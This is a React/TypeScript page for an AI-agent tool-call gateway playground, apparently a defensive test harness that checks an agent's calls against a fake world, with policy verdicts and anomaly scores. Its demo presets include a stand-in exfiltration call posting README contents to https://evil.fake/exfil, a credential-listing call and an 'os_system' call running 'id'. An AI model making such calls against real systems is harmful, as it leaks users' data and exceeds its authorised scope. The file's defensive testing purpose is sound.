import { useEffect, useRef, useState, type FormEvent } from "react";
import { api, ApiError } from "../api";
import { navigate, useAsync } from "../hooks";
import { AnomalyChart } from "../components/AnomalyChart";
import { StepTable } from "../components/StepTable";
import { Callout, Card, DecisionBadge, ErrorState, Loading } from "../components/ui";
import type { Meta, SessionState } from "../types";

const CUSTOM = "__custom__";

// Demo shortcuts. They are just pre-filled tool calls; the gateway decides.
const PRESETS: { label: string; tool: string; args: Record<string, string> }[] = [
  { label: "Read README", tool: "fs_read", args: { path: "/workspace/README.md" } },
  { label: "Search 'debug'", tool: "repo_search", args: { query: "debug" } },
  { label: "List credentials", tool: "creds_list", args: {} },
  { label: "POST to evil.fake", tool: "http_post", args: { url: "https://evil.fake/exfil", body: "README contents" } },
  { label: "POST to allowlisted host", tool: "http_post", args: { url: "https://fake.local/api", body: "report" } },
  { label: "Write file", tool: "fs_write", args: { path: "/workspace/notes.txt", content: "summary" } },
  { label: "Unknown tool", tool: "os_system", args: { cmd: "id" } },
];

// ------------------------------------------------------------------ create

function NewSession({ meta, onCreated }: { meta: Meta; onCreated: (s: SessionState) => void }) {
  const scenarios = useAsync(() => api.scenarios(), []);
  const [text, setText] = useState("Summarize /workspace/README.md for the user.");
  const [scopes, setScopes] = useState<string[]>(["workspace_read"]);
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState<string | null>(null);

  const create = async (body: Parameters<typeof api.createSession>[0]) => {
    setBusy(true);
    setErr(null);
    try {
      onCreated(await api.createSession(body));
    } catch (e) {
      setErr(e instanceof Error ? e.message : String(e));
    } finally {
      setBusy(false);
    }
  };

  const submit = (e: FormEvent) => {
    e.preventDefault();
    void create({ objective_text: text, allowed_scopes: scopes });
  };

  return (
    <div className="grid cols-2">
      <Card title="Custom objective" hint="you drive the agent by hand">
        <form className="stack" style={{ gap: 14 }} onSubmit={submit}>
          <label className="field">
            Authorised objective
            <textarea value={text} maxLength={2000} onChange={(e) => setText(e.target.value)} required />
          </label>
          <fieldset className="field" style={{ border: 0, padding: 0, margin: 0 }}>
            <legend className="small" style={{ fontWeight: 560, color: "var(--ink-2)", marginBottom: 5 }}>
              Allowed scopes
            </legend>
            <div className="checks">
              {meta.known_scopes.map((s) => (
                <label key={s} className="check">
                  <input
                    type="checkbox"
                    checked={scopes.includes(s)}
                    onChange={(e) => setScopes(e.target.checked ? [...scopes, s] : scopes.filter((x) => x !== s))}
                  />
                  {s}
                </label>
              ))}
            </div>
          </fieldset>
          <p className="small muted">
            The objective is frozen when the session starts. Policy reads scopes from it; the agent cannot change it.
          </p>
          {err && <div className="form-error">{err}</div>}
          <div>
            <button className="btn primary" disabled={busy || !text.trim()}>
              Start session
            </button>
          </div>
        </form>
      </Card>

      <Card title="Start from a scenario" hint="replay its scripted agent step by step" flush>
        {scenarios.loading && (
          <div style={{ padding: 16 }}>
            <Loading />
          </div>
        )}
        {scenarios.error && (
          <div style={{ padding: 16 }}>
            <ErrorState error={scenarios.error} onRetry={scenarios.reload} />
          </div>
        )}
        <ul className="list">
          {scenarios.data?.map((s) => (
            <li key={s.id}>
              <span className={`badge ${s.type === "attack" ? "unsafe" : "safe"}`}>{s.type}</span>
              <span className="grow" title={s.objective.text}>
                <strong style={{ fontWeight: 560 }}>{s.id}</strong>{" "}
                <span className="muted">· {s.objective.text}</span>
              </span>
              <button className="btn sm" disabled={busy} onClick={() => void create({ scenario_id: s.id })}>
                Load
              </button>
            </li>
          ))}
        </ul>
      </Card>
    </div>
  );
}

// ---------------------------------------------------------------- composer

function Composer({
  meta,
  disabled,
  onCall,
}: {
  meta: Meta;
  disabled: boolean;
  onCall: (tool: string, args: Record<string, string>) => Promise<void>;
}) {
  const [tool, setTool] = useState(meta.tools[0]?.name ?? "fs_read");
  const [customTool, setCustomTool] = useState("");
  const [args, setArgs] = useState<Record<string, string>>({ path: "/workspace/README.md" });
  const [customArg, setCustomArg] = useState({ key: "", value: "" });

  const spec = meta.tools.find((t) => t.name === tool);

  const fire = (e?: FormEvent) => {
    e?.preventDefault();
    if (tool === CUSTOM) {
      const a: Record<string, string> = {};
      if (customArg.key.trim()) a[customArg.key.trim()] = customArg.value;
      void onCall(customTool.trim(), a);
      return;
    }
    // Send only this tool's params; omit optional blanks so defaults apply.
    const a: Record<string, string> = {};
    for (const p of spec?.params ?? []) {
      const v = args[p.name] ?? "";
      if (p.required || v !== "") a[p.name] = v;
    }
    void onCall(tool, a);
  };

  const applyPreset = (p: (typeof PRESETS)[number]) => {
    if (meta.tools.some((t) => t.name === p.tool)) {
      setTool(p.tool);
      setArgs(p.args);
    } else {
      setTool(CUSTOM);
      setCustomTool(p.tool);
      const [k = "", v = ""] = Object.entries(p.args)[0] ?? [];
      setCustomArg({ key: k, value: v });
    }
  };

  return (
    <form className="stack" style={{ gap: 12 }} onSubmit={fire}>
      <div className="row" style={{ gap: 6 }}>
        {PRESETS.map((p) => (
          <button type="button" key={p.label} className="btn sm" onClick={() => applyPreset(p)}>
            {p.label}
          </button>
        ))}
      </div>
      <div className="grid" style={{ gridTemplateColumns: "minmax(140px, 200px) 1fr", alignItems: "start" }}>
        <label className="field">
          Tool
          <select value={tool} onChange={(e) => setTool(e.target.value)}>
            {meta.tools.map((t) => (
              <option key={t.name} value={t.name}>
                {t.name}
              </option>
            ))}
            <option value={CUSTOM}>other (unregistered)…</option>
          </select>
        </label>
        <div className="stack" style={{ gap: 10 }}>
          {tool === CUSTOM ? (
            <>
              <label className="field">
                Tool name
                <input type="text" className="mono" value={customTool} placeholder="e.g. os_system" onChange={(e) => setCustomTool(e.target.value)} />
              </label>
              <div className="grid cols-2" style={{ gap: 10 }}>
                <label className="field">
                  Arg name
                  <input type="text" className="mono" value={customArg.key} onChange={(e) => setCustomArg({ ...customArg, key: e.target.value })} />
                </label>
                <label className="field">
                  Arg value
                  <input type="text" className="mono" value={customArg.value} onChange={(e) => setCustomArg({ ...customArg, value: e.target.value })} />
                </label>
              </div>
            </>
          ) : spec && spec.params.length > 0 ? (
            spec.params.map((p) => (
              <label key={p.name} className="field">
                <span>
                  {p.name} {!p.required && <span className="muted">(optional)</span>}
                </span>
                {p.name === "content" || p.name === "body" ? (
                  <textarea className="mono" rows={2} value={args[p.name] ?? ""} onChange={(e) => setArgs({ ...args, [p.name]: e.target.value })} />
                ) : (
                  <input type="text" className="mono" value={args[p.name] ?? ""} onChange={(e) => setArgs({ ...args, [p.name]: e.target.value })} />
                )}
              </label>
            ))
          ) : (
            <p className="small muted" style={{ paddingTop: 24 }}>
              No arguments.
            </p>
          )}
        </div>
      </div>
      <div>
        <button className="btn primary" disabled={disabled || (tool === CUSTOM && !customTool.trim())}>
          Send through gateway
        </button>
      </div>
    </form>
  );
}

// ----------------------------------------------------------------- session

function SessionView({ meta, initial }: { meta: Meta; initial: SessionState }) {
  const [s, setS] = useState(initial);
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  useEffect(() => setS(initial), [initial]);

  const run = async (fn: () => Promise<SessionState>) => {
    setBusy(true);
    setErr(null);
    try {
      setS(await fn());
    } catch (e) {
      setErr(e instanceof Error ? e.message : String(e));
    } finally {
      setBusy(false);
    }
  };

  const runAll = async () => {
    setBusy(true);
    setErr(null);
    try {
      let cur = s;
      while (cur.script && cur.script.position < cur.script.total) {
        cur = await api.scriptNext(cur.id);
        setS(cur);
      }
    } catch (e) {
      setErr(e instanceof Error ? e.message : String(e));
    } finally {
      setBusy(false);
    }
  };

  const last = s.steps[s.steps.length - 1];
  const full = s.steps.length >= s.max_steps;
  const blocked = s.steps.filter((x) => x.decision === "BLOCK").length;
  const agentFiles = s.world.files.filter((f) => f.created_by_agent);

  return (
    <div className="stack">
      <div className="split">
        <Card
          title="Authorised objective"
          hint={`immutable · ${s.objective.task_id}`}
          actions={
            <button className="btn sm ghost" onClick={() => navigate("/playground")}>
              New session
            </button>
          }
        >
          <div className="objective">{s.objective.text}</div>
          <div className="objective-meta">
            <span className="small muted">Scopes</span>
            {s.objective.allowed_scopes.length ? (
              s.objective.allowed_scopes.map((x) => (
                <span key={x} className="chip mono accent">
                  {x}
                </span>
              ))
            ) : (
              <span className="small muted">none</span>
            )}
            <span className="spacer" />
            <span className="chip">enforce mode</span>
            <span className="chip mono">{s.agent_id}</span>
          </div>
        </Card>
        <Card title="Session">
          <dl className="kv">
            <dt>Tool calls</dt>
            <dd className="num">
              {s.steps.length} / {s.max_steps}
            </dd>
            <dt>Blocked</dt>
            <dd className="num">{blocked}</dd>
            <dt>Last decision</dt>
            <dd>{last ? <DecisionBadge value={last.decision} /> : "—"}</dd>
            {s.scenario_id && (
              <>
                <dt>Scenario</dt>
                <dd>
                  <a href={`#/scenarios/${encodeURIComponent(s.scenario_id)}`}>{s.scenario_id}</a>
                </dd>
              </>
            )}
          </dl>
        </Card>
      </div>

      {err && <ErrorState error={new Error(err)} />}
      {full && (
        <Callout tone="warning" icon="▲" title="Session step limit reached">
          Start a new session to keep experimenting.
        </Callout>
      )}

      <div className="split">
        <div className="stack">
          {s.script && (
            <Card title="Scripted agent" hint={`${s.script.position} of ${s.script.total} calls sent`}>
              <div className="row">
                <button
                  className="btn primary"
                  disabled={busy || full || s.script.position >= s.script.total}
                  onClick={() => void run(() => api.scriptNext(s.id))}
                >
                  {s.script.next_tool ? (
                    <>
                      ▶ Next: <span className="mono">{s.script.next_tool}</span>
                    </>
                  ) : (
                    "Script finished"
                  )}
                </button>
                <button className="btn" disabled={busy || full || s.script.position >= s.script.total} onClick={() => void runAll()}>
                  Run remaining
                </button>
                <span className="small muted">
                  Unlike the record-mode replay, blocked calls here do not execute, so later steps see a different world.
                </span>
              </div>
            </Card>
          )}
          <Card title={s.script ? "Or send your own call" : "Send a tool call"} hint="the gateway is the agent's only path to tools">
            <Composer meta={meta} disabled={busy || full} onCall={(t, a) => run(() => api.call(s.id, t, a))} />
          </Card>
        </div>

        <Card title="Fake world" hint="in-process · no sockets" flush>
          <div style={{ padding: "0 16px 6px" }}>
            <h3>Egress sink ({s.world.http_sink.length})</h3>
          </div>
          {s.world.http_sink.length === 0 ? (
            <div className="small muted" style={{ padding: "0 16px 12px" }}>
              Nothing has left the box.
            </div>
          ) : (
            <ul className="list">
              {s.world.http_sink.map((h, i) => (
                <li key={i}>
                  <span className="badge ESCALATE">sent</span>
                  <span className="grow mono small" title={`${h.url} ← ${h.body_redacted ?? ""}`}>
                    {h.url}
                  </span>
                </li>
              ))}
            </ul>
          )}
          <div style={{ padding: "12px 16px 6px", borderTop: "1px solid var(--border)" }}>
            <h3>Files written by the agent ({agentFiles.length})</h3>
          </div>
          {agentFiles.length === 0 ? (
            <div className="small muted" style={{ padding: "0 16px 12px" }}>
              None. Workspace has {s.world.files.length} seed files.
            </div>
          ) : (
            <ul className="list">
              {agentFiles.map((f) => (
                <li key={f.path}>
                  <span className="grow mono small">{f.path}</span>
                  <span className="small muted num">{f.bytes} B</span>
                </li>
              ))}
            </ul>
          )}
          <div style={{ padding: "12px 16px 14px", borderTop: "1px solid var(--border)" }}>
            <h3>Credential store</h3>
            <div className="row" style={{ marginTop: 6 }}>
              {s.world.credential_names.map((c) => (
                <span key={c} className="chip mono">
                  {c}
                </span>
              ))}
            </div>
            <p className="small muted" style={{ marginTop: 6 }}>
              Synthetic canary values; redacted in every response.
            </p>
          </div>
        </Card>
      </div>

      <Card title="Anomaly score" hint="advisory · Isolation Forest fit on benign scenarios">
        <AnomalyChart
          steps={s.steps}
          firstUnsafe={s.scenario_id ? s.steps.find((x) => x.label === "unsafe")?.step ?? null : null}
          threshold={meta.detector.threshold}
        />
      </Card>

      <Card title="Gateway log" hint="click a row for redacted args and result" flush>
        <StepTable steps={s.steps} labelled={s.scenario_id !== null} mode="enforce" />
      </Card>
    </div>
  );
}

// -------------------------------------------------------------------- page

export function Playground({ sessionId, scenarioId }: { sessionId: string | null; scenarioId: string | null }) {
  const meta = useAsync(() => api.meta(), []);
  const session = useAsync(() => (sessionId ? api.session(sessionId) : Promise.resolve(null)), [sessionId]);
  const [bootErr, setBootErr] = useState<Error | null>(null);
  const booted = useRef<string | null>(null);

  // ?scenario=ID → create a scenario session once, then swap the URL to ?s=SESSION.
  useEffect(() => {
    if (!scenarioId || sessionId || booted.current === scenarioId) return;
    booted.current = scenarioId;
    api
      .createSession({ scenario_id: scenarioId })
      .then((s) => navigate(`/playground?s=${s.id}`, true))
      .catch((e: unknown) => setBootErr(e instanceof Error ? e : new Error(String(e))));
  }, [scenarioId, sessionId]);

  const expired = session.error instanceof ApiError && session.error.status === 404;

  return (
    <div className="stack">
      <header className="page-head">
        <div>
          <h1>Gateway playground</h1>
          <p>
            Drive an agent against fake tools in <strong>enforce</strong> mode: blocked calls never execute. Each call
            shows the authoritative policy verdict and the advisory signals (mock intent judge, anomaly score).
          </p>
        </div>
      </header>

      {(meta.loading || (sessionId && session.loading && !session.data) || (scenarioId && !sessionId && !bootErr)) && <Loading rows={4} />}
      {meta.error && <ErrorState error={meta.error} onRetry={meta.reload} />}
      {bootErr && <ErrorState error={bootErr} />}
      {expired && (
        <Callout tone="warning" icon="▲" title="Session not found">
          Sessions live in server memory and are cleared on restart (at most 64 are kept).{" "}
          <a href="#/playground">Start a new one</a>.
        </Callout>
      )}
      {session.error && !expired && <ErrorState error={session.error} onRetry={session.reload} />}

      {meta.data && !sessionId && !scenarioId && (
        <NewSession meta={meta.data} onCreated={(s) => navigate(`/playground?s=${s.id}`)} />
      )}
      {meta.data && session.data && <SessionView meta={meta.data} initial={session.data} />}
    </div>
  );
}
